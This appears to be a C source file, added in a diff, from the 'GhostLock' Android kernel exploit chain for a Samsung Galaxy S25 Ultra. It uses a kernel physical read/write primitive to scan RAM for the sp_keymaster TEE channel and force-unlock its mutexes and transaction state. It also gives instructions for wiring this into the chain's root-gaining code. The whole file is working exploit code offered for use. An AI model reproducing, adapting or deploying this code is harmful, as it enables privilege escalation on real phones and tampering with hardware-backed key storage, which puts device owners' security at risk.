@@ -1,0 +1,738 @@
+/*
+ * spcom_unlock.c — Kernel memory scanner for sp_keymaster channel mutex unlock
+ *
+ * Part of the GhostLock exploit chain (CVE-2026-43499).
+ * This module scans the kernel module memory region for the spcom.ko
+ * "sp_keymaster" channel and unlocks its mutex to enable TEE communication.
+ *
+ * Integration: Call unlock_spcom_mutex(fd) from install_child_root() in fops.c
+ *              AFTER install_pipe_physrw(fd) succeeds and BEFORE install_android_root(fd).
+ *
+ * Requires:    Pipe physrw primitives (pipe_read64/pipe_write64/pipe_phys_read_data)
+ *              KASLR slide determined (kaslr_done, kaslr_base, kaslr_slide)
+ *
+ * Build:       Compiled as part of the GhostLock exploit — include "common.h"
+ *
+ * spcom.ko channel layout (Samsung kernel 6.6.77, SM-S938W):
+ *   struct spcom_channel {
+ *     char name[SPCOM_CHANNEL_NAME_SIZE];  // +0x00, 32 bytes
+ *     struct mutex lock;                    // +0x20
+ *       - atomic_long_t owner;             // +0x20 (0 = unlocked)
+ *       - spinlock_t    wait_lock;          // +0x28
+ *       - struct list_head wait_list;       // +0x30 (next, prev)
+ *     ...                                   // total 0x6F8 bytes per channel
+ *   };
+ *
+ *   spcom_dev global pointer → device struct
+ *   Channel array at spcom_dev + 0x4B0
+ *   Up to ~20 channels, each 0x6F8 bytes
+ */
+
+#include "common.h"
+
+/* ================================================================
+ * spcom channel structure offsets
+ * ================================================================ */
+#define SPCOM_CHANNEL_NAME_SIZE     32
+#define SPCOM_CHANNEL_NAME_OFF      0x00
+#define SPCOM_CHANNEL_MUTEX_OFF     0x20
+#define SPCOM_CHANNEL_SIZE          0x6F8
+#define SPCOM_DEV_CHANNELS_OFF      0x4B0
+#define SPCOM_MAX_CHANNELS          20
+
+/* Target channel name */
+#define SPCOM_TARGET_NAME           "sp_keymaster"
+#define SPCOM_TARGET_NAME_LEN       12  /* strlen("sp_keymaster") */
+
+/* Linux kernel mutex layout (ARM64, kernel 6.6.x)
+ *   +0x00: atomic_long_t owner    (0 = unlocked, task_struct* | flags = locked)
+ *   +0x08: spinlock_t    wait_lock
+ *   +0x10: struct list_head wait_list { next, prev }
+ *
+ * To unlock: write 0 to owner field.
+ * The wait_list should be empty (next == prev == &wait_list) for a clean unlock.
+ */
+#define MUTEX_OWNER_OFF             0x00
+#define MUTEX_WAIT_LOCK_OFF         0x08
+#define MUTEX_WAIT_LIST_OFF         0x10
+
+/* ================================================================
+ * Module memory region scan parameters
+ *
+ * On Samsung Galaxy S25 Ultra (SM-S938W), kernel 6.6.77:
+ *   - KIMAGE_TEXT_BASE = 0xffffffc080000000
+ *   - Kernel modules are loaded in the module region which on ARM64
+ *     with VA_BITS=39 and KASLR is near the kernel image.
+ *   - The module region starts at MODULES_VADDR and extends 128MB.
+ *   - With Samsung's layout: modules are typically loaded at
+ *     kernel_end to kernel_end + 128MB, or before kernel_base.
+ *
+ * Since we have the direct-map (physrw) primitive, we convert module
+ * virtual addresses to physical via the linear map. The module region
+ * physical addresses land in the same range as the kernel image:
+ *   kernel phys load = 0xa8000000
+ *   modules extend after kernel .bss end
+ *
+ * Strategy: Scan the physical memory after the kernel image for the
+ * "sp_keymaster\0" string. The kernel image is loaded at phys 0xa8000000.
+ * The kernel .bss end is typically at KIMAGE_TEXT_BASE + ~0x2600000 = phys ~0xaa600000.
+ * Modules load after that, up to ~phys 0xb0000000 (128MB window).
+ *
+ * We scan in 4KB page increments, reading 4KB per page, searching
+ * for the 13-byte needle "sp_keymaster\0".
+ * ================================================================ */
+
+/* Physical address range to scan for module data.
+ * We scan from kernel_phys_end to kernel_phys_end + MODULE_SCAN_SIZE.
+ * The kernel image size is approximately 0x2700000 bytes (39MB).
+ * Module region follows after .bss, covering up to 128MB.
+ *
+ * These are physical addresses. We convert them to direct-map addresses
+ * using: direct_addr = P0_PAGE_OFFSET | (phys - P0_PHYS_OFFSET)
+ */
+#define KERNEL_IMAGE_SIZE_APPROX    0x02700000ULL
+#define MODULE_SCAN_SIZE            0x08000000ULL  /* 128 MB for module area */
+#define HEAP_SCAN_SIZE              0x300000000ULL /* 12 GB — full RAM scan */
+#define SCAN_PAGE_SIZE              4096
+/* Read in page-aligned chunks of 256 bytes to stay within page boundaries.
+ * pipe_phys_read_data requires (addr & 0xFFF) + len <= PAGE_SIZE.
+ * By aligning reads to 256-byte boundaries, we guarantee no page crossing. */
+#define SCAN_READ_CHUNK             256
+
+/* Convert a physical address to a direct-map (linear map) address */
+static inline uintptr_t phys_to_direct(uint64_t phys) {
+  return (uintptr_t)(P0_PAGE_OFFSET | (phys - P0_PHYS_OFFSET));
+}
+
+/*
+ * Wrappers around the pipe physrw primitives.
+ * root_read_data/root_write64/etc are static in root.c, so we use the
+ * globally-visible pipe_phys_* functions from pipe.c directly.
+ * These are declared in common.h:
+ *   int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
+ *   int pipe_phys_write_data(int fd, uintptr_t direct_addr, const void *data, size_t len);
+ *   uint64_t pipe_read64(int fd, uintptr_t direct_addr);
+ *   int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
+ */
+static int spcom_read_data(int fd, uintptr_t addr, void *buf, size_t len) {
+  return pipe_phys_read_data(fd, addr, buf, len);
+}
+
+static uint64_t spcom_read64(int fd, uintptr_t addr) {
+  return pipe_read64(fd, addr);
+}
+
+static int spcom_write64(int fd, uintptr_t addr, uint64_t value) {
+  return pipe_write64(fd, addr, value);
+}
+
+/*
+ * scan_for_string - Search kernel memory for a byte pattern
+ *
+ * @fd:          Exploit fd for pipe physrw
+ * @start_phys:  Physical address to start scanning
+ * @scan_len:    Number of bytes to scan
+ * @needle:      String to search for
+ * @needle_len:  Length of string including null terminator
+ *
+ * Returns: Direct-map address of the match, or 0 if not found.
+ *
+ * The scan reads 256 bytes at a time (crossing read boundaries by
+ * overlapping by needle_len-1 bytes) to avoid missing matches at
+ * chunk boundaries.
+ */
+static uintptr_t scan_for_string(
+    int fd, uint64_t start_phys, uint64_t scan_len,
+    const char *needle, size_t needle_len) {
+
+  /* Page-align the start address */
+  start_phys = start_phys & ~(uint64_t)(SCAN_PAGE_SIZE - 1);
+  uint64_t end_phys = start_phys + scan_len;
+  /* Read FULL pages — no gaps from page boundary clamping! */
+  unsigned char buf[SCAN_PAGE_SIZE + 16];
+
+  pr_info("spcom scan start phys=%016llx end=%016llx needle=%s len=%zu\n",
+          (unsigned long long)start_phys,
+          (unsigned long long)end_phys,
+          needle, needle_len);
+
+  uint64_t pages_scanned = 0;
+  /* Scan one page at a time — guarantees no gaps */
+  for (uint64_t phys = start_phys; phys < end_phys; phys += SCAN_PAGE_SIZE) {
+    uintptr_t direct = phys_to_direct(phys);
+    if (!is_direct_ptr(direct)) continue;
+
+    /* Read FULL page in ONE call (addr is page-aligned → len can be 4096) */
+    int ok = spcom_read_data(fd, direct, buf, SCAN_PAGE_SIZE);
+    if (!ok) continue; /* Unmapped page — skip */
+
+    /* Search entire page for needle */
+    for (size_t i = 0; i + needle_len <= SCAN_PAGE_SIZE; i++) {
+      if (memcmp(buf + i, needle, needle_len) == 0) {
+        uintptr_t found_addr = phys_to_direct(phys + i);
+        pr_info("spcom candidate \"%s\" at phys=%016llx direct=%016zx\n",
+                needle, (unsigned long long)(phys + i), found_addr);
+
+        /* Validation 1: address must be 8-byte aligned (kmalloc alignment) */
+        if ((phys + i) & 0x7) continue;
+
+        /* Validation 2: bytes 12-15 must be zero (null terminator + 3 pad)
+         * Bytes 16-31 may have stale slab data — don't check strictly */
+        int is_channel = 1;
+        for (size_t j = needle_len; j < 16 && (i + j) < SCAN_PAGE_SIZE; j++) {
+          if (buf[i + j] != 0) { is_channel = 0; break; }
+        }
+        if (!is_channel) continue;
+
+        /* Validation 3: mutex owner at +0x20 must be 0 or a kernel ptr */
+        uint64_t mutex_val = 0;
+        if (i + 0x28 <= SCAN_PAGE_SIZE) {
+          memcpy(&mutex_val, buf + i + 0x20, 8);
+        } else {
+          mutex_val = spcom_read64(fd, found_addr + 0x20);
+        }
+        int mutex_ok = (mutex_val == 0) ||
+                       ((mutex_val >> 48) == 0xffff) ||
+                       ((mutex_val >> 40) == 0xffffff);
+        pr_info("  candidate phys=%llx mutex=%016llx mutex_ok=%d\n",
+                (unsigned long long)(phys+i), (unsigned long long)mutex_val, mutex_ok);
+        if (!mutex_ok) continue;
+
+        pr_success("spcom found CHANNEL \"%s\" at phys=%016llx direct=%016zx "
+                   "(name field null-padded!)\n",
+                   needle, (unsigned long long)(phys + i), found_addr);
+        return found_addr;
+      }
+    }
+
+    pages_scanned++;
+    /* Progress report every 8192 chunks (~2MB) */
+    if ((pages_scanned & 0x1FFF) == 0) {
+      pr_info("spcom scan progress phys=%016llx scanned=%llu chunks\n",
+              (unsigned long long)phys, (unsigned long long)pages_scanned);
+    }
+  }
+
+  return 0;
+}
+
+/*
+ * verify_spcom_channel - Verify that an address looks like a valid spcom channel
+ *
+ * After finding the "sp_keymaster" string, verify the surrounding memory
+ * looks like a plausible spcom_channel struct:
+ *   1. Name at offset 0 matches "sp_keymaster"
+ *   2. Mutex owner at +0x20 is a kernel pointer or 0
+ *   3. Mutex wait_list at +0x30 looks like a valid list_head
+ *
+ * @fd:           Exploit fd
+ * @channel_addr: Direct-map address of the suspected channel
+ *
+ * Returns: 1 if it looks valid, 0 otherwise
+ */
+static int verify_spcom_channel(int fd, uintptr_t channel_addr) {
+  /* Read the full name field */
+  char name[SPCOM_CHANNEL_NAME_SIZE];
+  memset(name, 0, sizeof(name));
+  int ok = spcom_read_data(fd, channel_addr + SPCOM_CHANNEL_NAME_OFF,
+                          name, sizeof(name));
+  if (!ok) {
+    pr_warning("spcom verify: failed to read name at %016zx\n", channel_addr);
+    return 0;
+  }
+
+  if (memcmp(name, SPCOM_TARGET_NAME, SPCOM_TARGET_NAME_LEN + 1) != 0) {
+    pr_warning("spcom verify: name mismatch at %016zx\n", channel_addr);
+    return 0;
+  }
+
+  /* Read the mutex owner field */
+  uint64_t mutex_owner = spcom_read64(fd,
+      channel_addr + SPCOM_CHANNEL_MUTEX_OFF + MUTEX_OWNER_OFF);
+
+  /* Read the mutex wait_list */
+  uint64_t wait_list_next = spcom_read64(fd,
+      channel_addr + SPCOM_CHANNEL_MUTEX_OFF + MUTEX_WAIT_LIST_OFF);
+  uint64_t wait_list_prev = spcom_read64(fd,
+      channel_addr + SPCOM_CHANNEL_MUTEX_OFF + MUTEX_WAIT_LIST_OFF + 8);
+
+  uintptr_t wait_list_addr =
+      channel_addr + SPCOM_CHANNEL_MUTEX_OFF + MUTEX_WAIT_LIST_OFF;
+
+  pr_info("spcom verify channel=%016zx name=\"%s\" "
+          "mutex_owner=%016llx wait_list={%016llx,%016llx} "
+          "wait_list_self=%016zx\n",
+          channel_addr, name,
+          (unsigned long long)mutex_owner,
+          (unsigned long long)wait_list_next,
+          (unsigned long long)wait_list_prev,
+          wait_list_addr);
+
+  /* Mutex owner should be:
+   *   0           = unlocked (already good, nothing to do)
+   *   kernel ptr  = locked by some task
+   *   ptr | flags = locked with waiter bits set (low bits 0-2)
+   */
+  if (mutex_owner != 0) {
+    uint64_t owner_ptr = mutex_owner & ~0x7ULL;
+    pr_info("spcom verify: mutex is LOCKED owner=%016llx (task=%016llx flags=%llu)\n",
+            (unsigned long long)mutex_owner,
+            (unsigned long long)(owner_ptr),
+            (unsigned long long)(mutex_owner & 0x7));
+  } else {
+    pr_info("spcom verify: mutex is already UNLOCKED\n");
+  }
+
+  /* ================================================================
+   * DUMP ALL CHANNEL FIELDS — find what blocks second send!
+   * Channel struct is 0x6F8 bytes. Key fields from spcom.ko RE:
+   *   +0x00: name[32]
+   *   +0x20: mutex (owner at +0x20, spinlock +0x28, waitlist +0x30)
+   *   +0x50: tx_count (init 0x12345678)
+   *   +0x54: actual_tx_size (halfword)
+   *   +0x55: is_server (byte)
+   *   +0x98: rpdev pointer (rpmsg device)
+   *   +0xA0: rpdev2 pointer
+   *   +0xA8: rx_done completion (.done at +0xA8)
+   *   +0xC8: connect_done completion
+   *   +0xE8: init_flag (byte)
+   *   +0xE9: is_server_mode (byte)
+   *   +0xEC: txn_counter
+   *   +0xF0: active_pid
+   *   +0xF4: ref_count (byte)
+   *   +0xF8: sync_mutex
+   *   +0x13C: abort_flag (byte)
+   *   +0x140: rx_buf_ptr
+   *   +0x148: rx_buf_count
+   *   +0x150: rx_buf_size
+   * ================================================================ */
+  pr_info("\n=== FULL CHANNEL DUMP at %016zx ===\n", channel_addr);
+
+  /* First: dump raw bytes at name field to check if it's really a channel struct
+   * A real channel has name[32] = "sp_keymaster\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
+   * A string table has "sp_keymaster" followed by OTHER strings */
+  pr_info("  name field raw bytes:\n");
+  for (int off = 0; off < 32; off += 8) {
+    uint64_t v = spcom_read64(fd, channel_addr + off);
+    pr_info("    +0x%02x: %016llx  [%c%c%c%c%c%c%c%c]\n", off,
+            (unsigned long long)v,
+            (v>>0)&0xFF  >= 0x20 && (v>>0)&0xFF  < 0x7F ? (char)((v>>0)&0xFF)  : '.',
+            (v>>8)&0xFF  >= 0x20 && (v>>8)&0xFF  < 0x7F ? (char)((v>>8)&0xFF)  : '.',
+            (v>>16)&0xFF >= 0x20 && (v>>16)&0xFF < 0x7F ? (char)((v>>16)&0xFF) : '.',
+            (v>>24)&0xFF >= 0x20 && (v>>24)&0xFF < 0x7F ? (char)((v>>24)&0xFF) : '.',
+            (v>>32)&0xFF >= 0x20 && (v>>32)&0xFF < 0x7F ? (char)((v>>32)&0xFF) : '.',
+            (v>>40)&0xFF >= 0x20 && (v>>40)&0xFF < 0x7F ? (char)((v>>40)&0xFF) : '.',
+            (v>>48)&0xFF >= 0x20 && (v>>48)&0xFF < 0x7F ? (char)((v>>48)&0xFF) : '.',
+            (v>>56)&0xFF >= 0x20 && (v>>56)&0xFF < 0x7F ? (char)((v>>56)&0xFF) : '.');
+  }
+
+  #define DUMP64(off, name) do { \
+    uint64_t v = spcom_read64(fd, channel_addr + (off)); \
+    pr_info("  ch+0x%03x %-20s = %016llx\n", (off), (name), (unsigned long long)v); \
+  } while(0)
+
+  #define DUMP32(off, name) do { \
+    uint64_t v = spcom_read64(fd, channel_addr + ((off) & ~7ULL)); \
+    uint32_t v32 = (uint32_t)(v >> (((off) & 7) * 8)); \
+    pr_info("  ch+0x%03x %-20s = %08x\n", (off), (name), v32); \
+  } while(0)
+
+  DUMP64(0x20, "mutex.owner");
+  DUMP64(0x28, "mutex.spinlock");
+  DUMP64(0x30, "mutex.wait_list.next");
+  DUMP64(0x38, "mutex.wait_list.prev");
+  DUMP64(0x48, "field_0x48");
+  DUMP64(0x50, "tx_count+flags");
+  DUMP64(0x58, "field_0x58");
+  DUMP64(0x60, "field_0x60");
+  DUMP64(0x68, "field_0x68");
+  DUMP64(0x70, "field_0x70");
+  DUMP64(0x78, "field_0x78");
+  DUMP64(0x80, "field_0x80");
+  DUMP64(0x88, "field_0x88");
+  DUMP64(0x90, "field_0x90");
+  DUMP64(0x98, "rpdev");
+  DUMP64(0xA0, "rpdev2/ept");
+  DUMP64(0xA8, "rx_done.done");
+  DUMP64(0xB0, "rx_done.swait");
+  DUMP64(0xC8, "connect_done.done");
+  DUMP64(0xE0, "field_0xE0");
+  DUMP64(0xE8, "init/server_flags");
+  DUMP64(0xF0, "active_pid+refcnt");
+  DUMP64(0xF8, "sync_mutex.owner");
+  DUMP64(0x100, "sync_mutex.spin");
+  DUMP64(0x108, "sync_mutex.wl.next");
+  DUMP64(0x110, "sync_mutex.wl.prev");
+  DUMP64(0x130, "field_0x130");
+  DUMP64(0x138, "abort+flags");
+  DUMP64(0x140, "rx_buf_ptr");
+  DUMP64(0x148, "rx_buf_count");
+  DUMP64(0x150, "rx_buf_size");
+  DUMP64(0x158, "field_0x158");
+
+  pr_info("=== END CHANNEL DUMP ===\n\n");
+
+  return 1;
+}
+
+/*
+ * unlock_spcom_mutex - Find sp_keymaster channel and unlock its mutex
+ *
+ * This is the main entry point. Call after GhostLock has established
+ * kernel R/W via the pipe physrw primitives.
+ *
+ * @fd: The exploit fd (ashmem configfs fd used for kernel R/W)
+ *
+ * Returns:
+ *   1  = Success (mutex unlocked or was already unlocked)
+ *   0  = Failure (channel not found or could not unlock)
+ *  -1  = Prerequisites not met (no KASLR, no physrw)
+ *
+ * The function:
+ *   1. Computes the module memory region based on KASLR slide
+ *   2. Scans for "sp_keymaster\0" in the module region
+ *   3. Verifies the found address is a valid spcom_channel
+ *   4. Reads the mutex state at channel + 0x20
+ *   5. Writes 0 to the mutex owner to unlock it
+ *   6. Verifies the unlock succeeded
+ */
+int unlock_spcom_mutex(int fd) {
+  pr_info("spcom unlock start fd=%d kaslr_done=%d kaslr_base=%016llx "
+          "kaslr_slide=%016llx\n",
+          fd, kaslr_done,
+          (unsigned long long)kaslr_base,
+          (unsigned long long)kaslr_slide);
+
+  if (!kaslr_done) {
+    pr_warning("spcom unlock: KASLR not determined, cannot scan\n");
+    return -1;
+  }
+
+  /* ================================================================
+   * Step 1: Determine the physical address range to scan
+   *
+   * The kernel image is loaded at P0_KERNEL_PHYS_LOAD (0xa8000000).
+   * The kernel image occupies approximately KERNEL_IMAGE_SIZE_APPROX bytes.
+   * Kernel modules are loaded in the virtual region after the kernel,
+   * which maps to physical addresses after the kernel image.
+   *
+   * We also need to scan BEFORE the kernel image for some Samsung
+   * configurations where modules are loaded at lower addresses.
+   * However, the most common layout places modules after kernel .bss.
+   *
+   * We scan two regions:
+   *   A) After kernel image: phys a8000000 + kernel_size to + 128MB
+   *   B) If not found, scan the kernel .data/.bss region itself
+   *      (spcom_dev is a global pointer in the module, but the
+   *       channel data might be in the module's own .data/.bss)
+   * ================================================================ */
+
+  /* Region A: Module memory after kernel image */
+  uint64_t scan_start_phys = P0_KERNEL_PHYS_LOAD + KERNEL_IMAGE_SIZE_APPROX;
+  uint64_t scan_size = MODULE_SCAN_SIZE;
+
+  /* The "sp_keymaster\0" needle — 13 bytes including the null terminator.
+   * We search for the null-terminated string because the channel name field
+   * is 32 bytes and is null-padded. */
+  const char needle[] = "sp_keymaster";
+  size_t needle_len = sizeof(needle);  /* includes trailing \0 = 13 bytes */
+
+  pr_info("spcom scan region A: module area phys=%016llx size=%016llx\n",
+          (unsigned long long)scan_start_phys,
+          (unsigned long long)scan_size);
+
+  uintptr_t found = scan_for_string(fd, scan_start_phys, scan_size,
+                                     needle, needle_len);
+
+  /* Region B: If not found in module area, try kernel .data/.rodata
+   * Some Samsung builds inline spcom into the kernel (not as module) */
+  if (!found) {
+    uint64_t kernel_data_start = P0_KERNEL_PHYS_LOAD;
+    uint64_t kernel_data_size = KERNEL_IMAGE_SIZE_APPROX;
+
+    pr_info("spcom scan region B: kernel image phys=%016llx size=%016llx\n",
+            (unsigned long long)kernel_data_start,
+            (unsigned long long)kernel_data_size);
+
+    found = scan_for_string(fd, kernel_data_start, kernel_data_size,
+                             needle, needle_len);
+  }
+
+  /* Region C: Kernel heap (kmalloc'd structs — channel is dynamically allocated!) */
+  if (!found) {
+    uint64_t heap_start = P0_PHYS_OFFSET; /* 0x80000000 — start of physical RAM */
+    pr_info("spcom scan region C: kernel heap phys=%016llx size=%016llx (2GB)\n",
+            (unsigned long long)heap_start, (unsigned long long)HEAP_SCAN_SIZE);
+    found = scan_for_string(fd, heap_start, HEAP_SCAN_SIZE, needle, needle_len);
+  }
+
+  if (!found) {
+    pr_warning("spcom unlock: \"sp_keymaster\" not found in 2GB scan!\n");
+    return 0;
+  }
+
+  /* ================================================================
+   * Step 2: Determine the channel base address
+   *
+   * The string "sp_keymaster" was found at `found`. This is the
+   * channel name field, which is at offset 0x00 of the channel struct.
+   * So the channel base address is `found` itself.
+   * ================================================================ */
+  uintptr_t channel_addr = found;
+
+  /* ================================================================
+   * Step 3: Verify the channel structure
+   * ================================================================ */
+  if (!verify_spcom_channel(fd, channel_addr)) {
+    pr_warning("spcom unlock: channel verification failed at %016zx\n",
+               channel_addr);
+    return 0;
+  }
+
+  /* ================================================================
+   * Step 4: Read current mutex state
+   * ================================================================ */
+  uintptr_t mutex_addr = channel_addr + SPCOM_CHANNEL_MUTEX_OFF;
+  uint64_t owner_before = spcom_read64(fd, mutex_addr + MUTEX_OWNER_OFF);
+  uint64_t waitlock_before = spcom_read64(fd, mutex_addr + MUTEX_WAIT_LOCK_OFF);
+
+  uintptr_t wait_list_addr = mutex_addr + MUTEX_WAIT_LIST_OFF;
+  uint64_t wl_next = spcom_read64(fd, wait_list_addr);
+  uint64_t wl_prev = spcom_read64(fd, wait_list_addr + 8);
+
+  pr_info("spcom mutex before: addr=%016zx owner=%016llx waitlock=%016llx "
+          "waitlist={%016llx, %016llx}\n",
+          mutex_addr,
+          (unsigned long long)owner_before,
+          (unsigned long long)waitlock_before,
+          (unsigned long long)wl_next,
+          (unsigned long long)wl_prev);
+
+  /* Save channel address to file so a separate tool can use it */
+  {
+    int sfd = open("/data/local/tmp/.spcom_channel", O_WRONLY|O_CREAT|O_TRUNC, 0666);
+    if (sfd >= 0) {
+      char abuf[64];
+      int an = snprintf(abuf, 64, "%016zx\n", channel_addr);
+      write(sfd, abuf, an);
+      close(sfd);
+      pr_info("spcom channel address saved to /data/local/tmp/.spcom_channel\n");
+    }
+  }
+
+  /* Check if we should clear state NOW (flag file exists = clear mode) */
+  int clear_mode = (access("/data/local/tmp/.spcom_clear", F_OK) == 0);
+  if (!clear_mode) {
+    pr_info("spcom: SCAN ONLY mode (create /data/local/tmp/.spcom_clear to enable clearing)\n");
+    if (owner_before == 0) {
+      pr_success("spcom mutex unlocked, channel live — ready for first send\n");
+      return 1;
+    }
+    /* Mutex is locked but we're not in clear mode — just report */
+    pr_info("spcom mutex LOCKED (owner=%016llx) — will clear in next run with .spcom_clear\n",
+            (unsigned long long)owner_before);
+    return 1;
+  }
+
+  pr_info("spcom CLEAR MODE — unlocking mutex and clearing ALL state!\n");
+  /* Remove the flag so we don't clear again accidentally */
+  unlink("/data/local/tmp/.spcom_clear");
+
+  /* ================================================================
+   * Step 5: Unlock the mutex
+   *
+   * Write 0 to the mutex owner field. This tells the kernel the mutex
+   * is unlocked and available for acquisition.
+   *
+   * We also need to ensure the wait_list is properly initialized
+   * (empty list: next == prev == &wait_list). If there are waiters,
+   * we clear them — this is acceptable because we're taking control
+   * of the channel and any waiters are stale TEE operations.
+   * ================================================================ */
+
+  /* Clear the mutex owner to 0 (unlocked) */
+  int write_ok = spcom_write64(fd, mutex_addr + MUTEX_OWNER_OFF, 0);
+  if (!write_ok) {
+    pr_warning("spcom mutex unlock: failed to write owner=0 at %016zx\n",
+               mutex_addr + MUTEX_OWNER_OFF);
+    return 0;
+  }
+
+  /* If wait_list is not a proper empty list, fix it.
+   * An empty list_head has next == prev == address_of_list_head */
+  if (wl_next != wait_list_addr || wl_prev != wait_list_addr) {
+    pr_info("spcom mutex: fixing wait_list (was {%016llx, %016llx}, "
+            "want {%016zx, %016zx})\n",
+            (unsigned long long)wl_next,
+            (unsigned long long)wl_prev,
+            wait_list_addr, wait_list_addr);
+
+    int wl_ok = spcom_write64(fd, wait_list_addr, wait_list_addr) &&
+                spcom_write64(fd, wait_list_addr + 8, wait_list_addr);
+    if (!wl_ok) {
+      pr_warning("spcom mutex: failed to reset wait_list\n");
+      /* Non-fatal: the unlock (owner=0) is the critical part */
+    }
+  }
+
+  /* Clear the spinlock too for good measure */
+  spcom_write64(fd, mutex_addr + MUTEX_WAIT_LOCK_OFF, 0);
+
+  /* ================================================================
+   * Step 6: Verify the unlock
+   * ================================================================ */
+  uint64_t owner_after = spcom_read64(fd, mutex_addr + MUTEX_OWNER_OFF);
+  uint64_t wl_next_after = spcom_read64(fd, wait_list_addr);
+  uint64_t wl_prev_after = spcom_read64(fd, wait_list_addr + 8);
+
+  pr_info("spcom mutex after: owner=%016llx waitlist={%016llx, %016llx}\n",
+          (unsigned long long)owner_after,
+          (unsigned long long)wl_next_after,
+          (unsigned long long)wl_prev_after);
+
+  if (owner_after != 0) {
+    pr_warning("spcom mutex unlock FAILED: owner still %016llx after write\n",
+               (unsigned long long)owner_after);
+    return 0;
+  }
+
+  pr_success("spcom mutex UNLOCKED at %016zx\n", mutex_addr);
+
+  /* ================================================================
+   * Step 6: Clear ALL other blocking state!
+   * The mutex alone isn't enough — there are MULTIPLE blockers:
+   *   +0xF0: active_pid — PID that owns the current transaction
+   *   +0xF8: sync_mutex (tx_lock) — second mutex serializing sends
+   *   +0x140: rx_buf_ptr — pending response (blocks new send if present)
+   *   +0x148: rx_buf_count
+   *   +0x150: rx_buf_size
+   *   +0xA8: rx_done completion .done counter
+   *   +0x13C: abort_flag
+   * ================================================================ */
+  pr_info("spcom clearing ALL blocking state at channel %016zx...\n",
+          channel_addr);
+
+  /* Clear active_pid at +0xF0 */
+  spcom_write64(fd, channel_addr + 0xF0, 0);
+  pr_info("  cleared active_pid at +0xF0\n");
+
+  /* Clear sync_mutex (tx_lock) at +0xF8 — same layout as mutex */
+  uint64_t sync_owner = spcom_read64(fd, channel_addr + 0xF8);
+  if (sync_owner != 0) {
+    spcom_write64(fd, channel_addr + 0xF8, 0);   /* owner = 0 */
+    spcom_write64(fd, channel_addr + 0x100, 0);   /* spinlock = 0 */
+    /* Fix sync_mutex wait_list */
+    uintptr_t sync_wl = channel_addr + 0x108;
+    spcom_write64(fd, sync_wl, sync_wl);          /* next = self */
+    spcom_write64(fd, sync_wl + 8, sync_wl);      /* prev = self */
+    pr_info("  cleared sync_mutex at +0xF8 (was %016llx)\n",
+            (unsigned long long)sync_owner);
+  }
+
+  /* Clear rx_buf (pending response) at +0x140 */
+  uint64_t rx_buf = spcom_read64(fd, channel_addr + 0x140);
+  if (rx_buf != 0) {
+    /* Note: we're leaking the kernel buffer, but that's acceptable */
+    spcom_write64(fd, channel_addr + 0x140, 0);   /* ptr = NULL */
+    spcom_write64(fd, channel_addr + 0x148, 0);   /* count = 0 */
+    spcom_write64(fd, channel_addr + 0x150, 0);   /* size = 0 */
+    pr_info("  cleared rx_buf at +0x140 (was %016llx)\n",
+            (unsigned long long)rx_buf);
+  }
+
+  /* Clear abort flag at +0x13C */
+  spcom_write64(fd, channel_addr + 0x138, 0);  /* clear +0x138 which includes +0x13C */
+
+  /* Reset rx_done completion at +0xA8 (.done field) */
+  spcom_write64(fd, channel_addr + 0xA8, 0);
+
+  pr_info("spcom ALL state cleared! Channel should accept new sends.\n");
+
+  /* Final verification dump */
+  pr_info("=== POST-CLEAR DUMP ===\n");
+  DUMP64(0x20, "mutex.owner");
+  DUMP64(0xF0, "active_pid");
+  DUMP64(0xF8, "sync_mutex.owner");
+  DUMP64(0x140, "rx_buf_ptr");
+  DUMP64(0xA8, "rx_done.done");
+  pr_info("=== END POST-CLEAR ===\n");
+
+  return 1;
+}
+
+/*
+ * ================================================================
+ * INTEGRATION POINT
+ * ================================================================
+ *
+ * In fops.c, function install_child_root(), change:
+ *
+ *   BEFORE (line 236):
+ *   -------
+ *   int install_child_root(int fd) {
+ *     return install_pipe_physrw(fd) && install_android_root(fd);
+ *   }
+ *
+ *   AFTER:
+ *   ------
+ *   int install_child_root(int fd) {
+ *     if (!install_pipe_physrw(fd)) {
+ *       return 0;
+ *     }
+ *
+ *     // Unlock sp_keymaster channel mutex for TEE access
+ *     int spcom_ok = unlock_spcom_mutex(fd);
+ *     pr_info("spcom unlock result=%d\n", spcom_ok);
+ *     // Non-fatal: proceed to root even if spcom unlock fails
+ *     // The channel may not exist on all firmware versions
+ *
+ *     return install_android_root(fd);
+ *   }
+ *
+ * Also add the declaration to common.h:
+ *
+ *   int unlock_spcom_mutex(int fd);
+ *
+ * And add spcom_unlock.c to the build (Makefile/Android.mk).
+ *
+ * ================================================================
+ * ALTERNATIVE: Call from root.c after root is gained
+ * ================================================================
+ *
+ * If you prefer to unlock the mutex AFTER gaining root (so the
+ * sp_keymaster channel is available to the root shell), add the
+ * call at the end of install_workqueue_umh_root() in root.c:
+ *
+ *   // At line 312 in root.c, before the final return:
+ *   if (socket_ok) {
+ *     int spcom_ok = unlock_spcom_mutex(fd);
+ *     pr_info("spcom unlock post-root result=%d\n", spcom_ok);
+ *   }
+ *   root_child_done = socket_ok;
+ *   root_uid_after = socket_ok ? 0 : root_uid_before;
+ *   return socket_ok;
+ *
+ * ================================================================
+ * SCAN OPTIMIZATION NOTES
+ * ================================================================
+ *
+ * The full 128MB scan can take several seconds if reading 256 bytes
+ * at a time through the pipe physrw primitive. Optimization options:
+ *
+ * 1. Read larger chunks (up to 4096 bytes) per call — the pipe
+ *    physrw supports up to PAGE_SIZE reads.
+ *
+ * 2. If spcom_dev address is known (e.g., from kallsyms in a
+ *    previous run or from the vmlinux symbols), add it as a define:
+ *
+ *    #define SPCOM_DEV_OFF 0x02XXXXXXULL  // from kallsyms
+ *    uintptr_t spcom_dev_ptr = data_addr(KIMAGE_TEXT_BASE + SPCOM_DEV_OFF);
+ *    uintptr_t spcom_dev = spcom_read64(fd, spcom_dev_ptr);
+ *    uintptr_t channels = spcom_dev + SPCOM_DEV_CHANNELS_OFF;
+ *    // Then iterate channels directly
+ *
+ * 3. If spcom is built into the kernel (not a module), the string
+ *    "sp_keymaster" will be in .rodata, but the channel struct with
+ *    the name filled in will be in .data/.bss. The scan handles both.
+ * ================================================================
+ */
